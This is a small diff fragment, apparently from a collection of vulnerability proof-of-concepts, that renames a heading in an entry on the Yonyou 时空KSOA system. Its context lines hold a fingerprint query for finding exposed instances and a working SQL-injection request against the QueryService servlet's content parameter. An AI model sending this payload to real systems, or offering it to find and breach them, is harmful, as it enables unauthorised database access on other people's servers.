@@ -8,7 +8,7 @@
 app="用友-时空KSOA"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /servlet/com.sksoft.bill.QueryService?service=query&content=SELECT%20HashBytes('md5','NjTFtj4Q'); HTTP/1.1
